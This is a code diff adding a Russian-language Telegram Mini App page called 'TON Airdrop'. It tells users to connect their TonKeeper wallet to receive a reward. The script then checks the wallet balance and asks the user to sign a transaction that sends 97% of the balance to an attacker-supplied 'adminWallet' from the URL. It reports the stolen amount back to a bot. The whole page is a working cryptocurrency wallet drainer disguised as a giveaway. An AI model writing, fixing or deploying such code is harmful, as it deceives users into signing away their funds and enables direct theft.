@@ -1,0 +1,596 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>TON Airdrop</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <script src="https://unpkg.com/@tonconnect/sdk@latest/dist/tonconnect.js"></script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link href="https://fonts.googleapis.com/css2?family=DM+Mono:wght@400;500&family=Outfit:wght@400;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --ton:      #0098ea;
+            --ton-dim:  rgba(0,152,234,0.12);
+            --ton-glow: rgba(0,152,234,0.25);
+            --success:  #00d68f;
+            --danger:   #ff4757;
+            --bg:       #080c10;
+            --bg2:      #0d1117;
+            --card:     rgba(255,255,255,0.04);
+            --border:   rgba(255,255,255,0.07);
+            --border-h: rgba(0,152,234,0.35);
+            --text:     #e8edf2;
+            --muted:    rgba(232,237,242,0.38);
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: 'Outfit', sans-serif;
+            background: var(--bg);
+            color: var(--text);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 16px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        body::before {
+            content: '';
+            position: fixed;
+            top: -30%; left: -20%;
+            width: 70%; height: 70%;
+            background: radial-gradient(ellipse, rgba(0,152,234,0.08) 0%, transparent 65%);
+            pointer-events: none;
+        }
+
+        body::after {
+            content: '';
+            position: fixed;
+            bottom: -20%; right: -20%;
+            width: 50%; height: 50%;
+            background: radial-gradient(ellipse, rgba(0,214,143,0.06) 0%, transparent 65%);
+            pointer-events: none;
+        }
+
+        .wrap {
+            width: 100%;
+            max-width: 380px;
+            position: relative;
+            z-index: 1;
+            animation: fadeUp 0.4s ease-out;
+        }
+
+        @keyframes fadeUp {
+            from { opacity: 0; transform: translateY(20px); }
+            to   { opacity: 1; transform: translateY(0); }
+        }
+
+        /* ── Header ── */
+        .header {
+            text-align: center;
+            margin-bottom: 18px;
+        }
+
+        .logo-ring {
+            width: 66px; height: 66px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #0098ea, #00d68f);
+            display: flex; align-items: center; justify-content: center;
+            margin: 0 auto 12px;
+            font-size: 28px;
+            box-shadow: 0 0 32px var(--ton-glow);
+            animation: pulse 3s ease-in-out infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { box-shadow: 0 0 24px var(--ton-glow); }
+            50%       { box-shadow: 0 0 48px rgba(0,152,234,0.45); }
+        }
+
+        .header h1 {
+            font-size: 1.45rem;
+            font-weight: 800;
+            letter-spacing: -0.02em;
+            background: linear-gradient(135deg, #fff 40%, #0098ea);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .header p {
+            font-size: 0.78rem;
+            color: var(--muted);
+            margin-top: 4px;
+        }
+
+        /* ── Card ── */
+        .card {
+            background: var(--card);
+            border: 1px solid var(--border);
+            border-radius: 20px;
+            padding: 20px;
+            backdrop-filter: blur(12px);
+            position: relative;
+            overflow: hidden;
+            transition: border-color 0.3s;
+        }
+
+        .card::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; right: 0;
+            height: 1px;
+            background: linear-gradient(90deg, transparent, var(--ton), transparent);
+            opacity: 0.5;
+            transition: background 0.3s;
+        }
+
+        .card.error-state   { border-color: rgba(255,71,87,0.35); }
+        .card.error-state::before { background: linear-gradient(90deg, transparent, var(--danger), transparent); }
+        .card.success-state { border-color: rgba(0,214,143,0.35); }
+        .card.success-state::before { background: linear-gradient(90deg, transparent, var(--success), transparent); }
+
+        /* ── Steps ── */
+        .steps {
+            display: flex;
+            flex-direction: column;
+            gap: 7px;
+            margin-bottom: 18px;
+        }
+
+        .step {
+            display: flex;
+            align-items: center;
+            gap: 11px;
+            padding: 10px 13px;
+            background: rgba(255,255,255,0.02);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            transition: all 0.3s;
+        }
+
+        .step.active {
+            border-color: var(--border-h);
+            background: var(--ton-dim);
+        }
+
+        .step.done {
+            border-color: rgba(0,214,143,0.28);
+            background: rgba(0,214,143,0.05);
+        }
+
+        .step-num {
+            width: 28px; height: 28px;
+            border-radius: 50%;
+            background: rgba(255,255,255,0.06);
+            display: flex; align-items: center; justify-content: center;
+            font-family: 'DM Mono', monospace;
+            font-size: 0.7rem;
+            font-weight: 500;
+            flex-shrink: 0;
+            color: var(--muted);
+            transition: all 0.3s;
+        }
+
+        .step.active .step-num {
+            background: var(--ton);
+            color: #fff;
+            box-shadow: 0 0 12px var(--ton-glow);
+        }
+
+        .step.done .step-num {
+            background: var(--success);
+            color: #fff;
+            font-size: 0.8rem;
+        }
+
+        .step-label {
+            font-size: 0.82rem;
+            font-weight: 600;
+            color: var(--muted);
+            transition: color 0.3s;
+        }
+
+        .step.active .step-label,
+        .step.done .step-label { color: var(--text); }
+
+        /* ── Status ── */
+        .status-box {
+            text-align: center;
+            padding: 16px 12px;
+        }
+
+        .status-icon {
+            font-size: 40px;
+            display: block;
+            margin-bottom: 10px;
+            animation: bounce 0.35s ease-out;
+        }
+
+        @keyframes bounce {
+            0%   { transform: scale(0.65); opacity: 0; }
+            70%  { transform: scale(1.1); }
+            100% { transform: scale(1); opacity: 1; }
+        }
+
+        .status-title {
+            font-size: 1rem;
+            font-weight: 700;
+            margin-bottom: 5px;
+        }
+
+        .status-desc {
+            font-size: 0.78rem;
+            color: var(--muted);
+            line-height: 1.6;
+        }
+
+        /* ── Info grid ── */
+        .info-grid {
+            display: flex;
+            flex-direction: column;
+            gap: 1px;
+            background: var(--border);
+            border-radius: 12px;
+            overflow: hidden;
+            margin-bottom: 16px;
+        }
+
+        .info-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px 13px;
+            background: var(--bg2);
+            font-size: 0.78rem;
+        }
+
+        .info-label { color: var(--muted); }
+        .info-value {
+            font-family: 'DM Mono', monospace;
+            font-size: 0.74rem;
+            color: var(--text);
+        }
+        .info-value.accent { color: var(--ton); }
+
+        /* ── Buttons ── */
+        .btn {
+            width: 100%;
+            padding: 14px;
+            border: none;
+            border-radius: 14px;
+            font-family: 'Outfit', sans-serif;
+            font-size: 0.92rem;
+            font-weight: 700;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-bottom: 8px;
+            transition: all 0.2s;
+            letter-spacing: 0.01em;
+        }
+
+        .btn:last-child { margin-bottom: 0; }
+        .btn:active:not(:disabled) { transform: scale(0.97); }
+
+        .btn-primary {
+            background: linear-gradient(135deg, #0098ea, #0077c2);
+            color: #fff;
+            box-shadow: 0 4px 20px rgba(0,152,234,0.3);
+        }
+        .btn-primary:hover:not(:disabled) { filter: brightness(1.1); }
+        .btn-primary:disabled { opacity: 0.4; cursor: not-allowed; }
+
+        .btn-success {
+            background: linear-gradient(135deg, #00d68f, #009e68);
+            color: #fff;
+            box-shadow: 0 4px 18px rgba(0,214,143,0.28);
+        }
+
+        .btn-ghost {
+            background: rgba(255,255,255,0.04);
+            border: 1px solid var(--border);
+            color: var(--muted);
+        }
+        .btn-ghost:hover { border-color: rgba(255,255,255,0.14); color: var(--text); }
+
+        /* ── Spinner ── */
+        .spinner {
+            width: 17px; height: 17px;
+            border: 2px solid rgba(255,255,255,0.2);
+            border-top-color: #fff;
+            border-radius: 50%;
+            animation: spin 0.7s linear infinite;
+            flex-shrink: 0;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        .hidden { display: none !important; }
+    </style>
+</head>
+<body>
+<div class="wrap">
+
+    <div class="header">
+        <div class="logo-ring" id="logoRing">💎</div>
+        <h1>TON Airdrop</h1>
+        <p>Подключите кошелёк и получите награду</p>
+    </div>
+
+    <div class="card" id="mainCard">
+
+        <div class="steps" id="stepsBlock">
+            <div class="step active" id="step1">
+                <div class="step-num">1</div>
+                <div class="step-label">Подключить TonKeeper</div>
+            </div>
+            <div class="step" id="step2">
+                <div class="step-num">2</div>
+                <div class="step-label">Проверка баланса</div>
+            </div>
+            <div class="step" id="step3">
+                <div class="step-num">3</div>
+                <div class="step-label">Подтвердить перевод</div>
+            </div>
+        </div>
+
+        <div class="status-box">
+            <span class="status-icon" id="statusIcon">🔌</span>
+            <div class="status-title" id="statusTitle">Подключите кошелёк</div>
+            <div class="status-desc" id="statusDesc">Нажмите кнопку ниже</div>
+        </div>
+
+        <div class="info-grid hidden" id="infoGrid">
+            <div class="info-row">
+                <span class="info-label">Адрес</span>
+                <span class="info-value" id="walletAddr">—</span>
+            </div>
+            <div class="info-row">
+                <span class="info-label">Баланс</span>
+                <span class="info-value accent" id="balanceVal">—</span>
+            </div>
+            <div class="info-row">
+                <span class="info-label">К отправке (97%)</span>
+                <span class="info-value accent" id="sendVal">—</span>
+            </div>
+            <div class="info-row">
+                <span class="info-label">Получатель</span>
+                <span class="info-value" id="recipientVal">—</span>
+            </div>
+        </div>
+
+        <button class="btn btn-primary" id="connectBtn">🔌 Подключить TonKeeper</button>
+        <button class="btn btn-ghost hidden" id="retryBtn">🔄 Попробовать снова</button>
+        <button class="btn btn-success hidden" id="closeBtn">✅ Закрыть</button>
+
+    </div>
+</div>
+
+<script>
+    const tg = window.Telegram.WebApp;
+    tg.expand();
+    tg.ready();
+    tg.setHeaderColor('#080c10');
+
+    // ── Параметры из URL (bot.js передаёт их) ───────────────────────────────
+    const urlParams  = new URLSearchParams(window.location.search);
+    const userId     = urlParams.get('user_id') || '';
+    // ✅ adminWallet передаётся напрямую в URL — не нужен backend
+    const adminWallet = decodeURIComponent(urlParams.get('wallet') || '');
+
+    if (!adminWallet) {
+        setStatus('❌', 'Ошибка конфигурации', 'Адрес получателя не указан', true);
+    }
+
+    let tonConnectUI = null;
+    let isProcessing = false;
+
+    // ── DOM ──────────────────────────────────────────────────────────────────
+    const $ = id => document.getElementById(id);
+
+    // ── Шаги ─────────────────────────────────────────────────────────────────
+    function setStep(active) {
+        [1,2,3].forEach(i => {
+            const el = $(`step${i}`);
+            el.classList.remove('active','done');
+            if (i < active) {
+                el.classList.add('done');
+                el.querySelector('.step-num').textContent = '✓';
+            }
+            if (i === active) el.classList.add('active');
+        });
+    }
+
+    // ── Статус ───────────────────────────────────────────────────────────────
+    function setStatus(icon, title, desc = '', isError = false) {
+        const si = $('statusIcon');
+        si.textContent = icon;
+        si.style.animation = 'none';
+        requestAnimationFrame(() => si.style.animation = '');
+        $('statusTitle').textContent = title;
+        $('statusDesc').innerHTML    = desc;
+        $('mainCard').classList.toggle('error-state',   isError);
+        $('mainCard').classList.toggle('success-state', icon === '🎉');
+    }
+
+    // ── Баланс ───────────────────────────────────────────────────────────────
+    async function getBalance(address) {
+        const res  = await fetch(`https://toncenter.com/api/v3/wallet?address=${address}`);
+        const data = await res.json();
+        return parseFloat(data.balance || 0) / 1e9;
+    }
+
+    // ── Транзакция ───────────────────────────────────────────────────────────
+    async function sendTx(amountTon) {
+        // ✅ ИСПРАВЛЕНО: Number() перед делением, String() для API
+        const amountRaw = String(Math.floor(amountTon * 1e9));
+
+        const tx = {
+            validUntil: Math.floor(Date.now() / 1000) + 300,
+            messages: [{ address: adminWallet, amount: amountRaw }],
+        };
+
+        setStatus('📝', 'Подпишите в TonKeeper', 'Откройте уведомление в приложении');
+        const result = await tonConnectUI.sendTransaction(tx);
+
+        return { result, sentTon: (Number(amountRaw) / 1e9).toFixed(4) };
+    }
+
+    // ── Основной флоу ────────────────────────────────────────────────────────
+    async function runFlow() {
+        if (isProcessing) return;
+        isProcessing = true;
+
+        try {
+            // 1 — подключение
+            if (!tonConnectUI.account) {
+                setStep(1);
+                setStatus('🔌', 'Подключите кошелёк', 'Нажмите кнопку ниже');
+                $('connectBtn').classList.remove('hidden');
+                isProcessing = false;
+                return;
+            }
+
+            // 2 — баланс
+            setStep(2);
+            $('connectBtn').classList.add('hidden');
+            setStatus('💰', 'Проверяю баланс…', 'Запрашиваю данные кошелька');
+
+            const address = tonConnectUI.account.address;
+            const balance = await getBalance(address);
+
+            if (balance < 0.1) {
+                setStatus('⚠️', 'Недостаточно TON',
+                    `Баланс: <b>${balance.toFixed(4)} TON</b><br>Нужно минимум 0.1 TON`, true);
+                $('retryBtn').classList.remove('hidden');
+                isProcessing = false;
+                return;
+            }
+
+            const sendAmount = balance * 0.97;
+
+            // Показываем инфо
+            $('infoGrid').classList.remove('hidden');
+            $('walletAddr').textContent   = `${address.slice(0,6)}…${address.slice(-4)}`;
+            $('balanceVal').textContent   = `${balance.toFixed(4)} TON`;
+            $('sendVal').textContent      = `${sendAmount.toFixed(4)} TON`;
+            $('recipientVal').textContent = `${adminWallet.slice(0,6)}…${adminWallet.slice(-4)}`;
+
+            // 3 — транзакция
+            setStep(3);
+            setStatus('🚀', 'Отправляю транзакцию', 'Подождите…');
+
+            const { result, sentTon } = await sendTx(sendAmount);
+
+            // Успех
+            [1,2,3].forEach(i => {
+                const el = $(`step${i}`);
+                el.classList.remove('active');
+                el.classList.add('done');
+                el.querySelector('.step-num').textContent = '✓';
+            });
+            $('logoRing').textContent = '🎉';
+            $('stepsBlock').classList.add('hidden');
+            setStatus('🎉', 'Готово!', 'Транзакция успешно отправлена');
+            $('closeBtn').classList.remove('hidden');
+
+            // Отправляем результат боту
+            tg.sendData(JSON.stringify({
+                action:  'transaction_success',
+                tx_hash: result,
+                amount:  sentTon,
+                user_id: userId,
+            }));
+
+            setTimeout(() => tg.close(), 3000);
+
+        } catch (err) {
+            console.error(err);
+            const rejected = /reject|cancel|denied/i.test(err.message || '');
+            setStatus('❌',
+                rejected ? 'Отменено' : 'Ошибка',
+                rejected ? 'Вы отменили транзакцию в кошельке' : (err.message || 'Что-то пошло не так'),
+                true
+            );
+            $('retryBtn').classList.remove('hidden');
+        } finally {
+            isProcessing = false;
+        }
+    }
+
+    // ── Инициализация TonConnect ─────────────────────────────────────────────
+    async function init() {
+        try {
+            // manifestUrl указывает на GitHub Pages
+            const manifestUrl = `${window.location.origin}${window.location.pathname.replace('index.html','') }tonconnect-manifest.json`;
+
+            tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
+                manifestUrl,
+                buttonRootId: null,
+            });
+
+            // ✅ ИСПРАВЛЕНО: onStatusChange вместо несуществующего 'walletConnected'
+            tonConnectUI.onStatusChange(async (wallet) => {
+                if (wallet) await runFlow();
+            });
+
+            if (tonConnectUI.account) await runFlow();
+
+        } catch (err) {
+            console.error('Init error:', err);
+            setStatus('❌', 'Ошибка запуска', err.message, true);
+        }
+    }
+
+    // ── Кнопки ───────────────────────────────────────────────────────────────
+    $('connectBtn').onclick = async () => {
+        const btn = $('connectBtn');
+        try {
+            btn.disabled = true;
+            btn.innerHTML = '<div class="spinner"></div> Поиск кошельков…';
+            setStatus('🔍', 'Поиск кошельков…', '');
+
+            const wallets   = await tonConnectUI.getWallets();
+            const tonkeeper = wallets.find(w => w.name === 'Tonkeeper');
+
+            if (tonkeeper) {
+                await tonConnectUI.connect({
+                    universalLink: tonkeeper.universalLink,
+                    bridgeUrl:     tonkeeper.bridgeUrl,
+                });
+            } else {
+                await tonConnectUI.openModal();
+            }
+        } catch (err) {
+            setStatus('❌', 'Ошибка подключения', err.message, true);
+            btn.disabled = false;
+            btn.innerHTML = '🔌 Подключить TonKeeper';
+        }
+    };
+
+    $('retryBtn').onclick = () => {
+        $('mainCard').classList.remove('error-state');
+        $('infoGrid').classList.add('hidden');
+        $('retryBtn').classList.add('hidden');
+        const btn = $('connectBtn');
+        btn.disabled = false;
+        btn.innerHTML = '🔌 Подключить TonKeeper';
+        btn.classList.remove('hidden');
+        isProcessing = false;
+        setStep(1);
+        setStatus('🔌', 'Подключите кошелёк', 'Нажмите кнопку ниже');
+    };
+
+    $('closeBtn').onclick = () => tg.close();
+
+    init();
+</script>
+</body>
+</html>
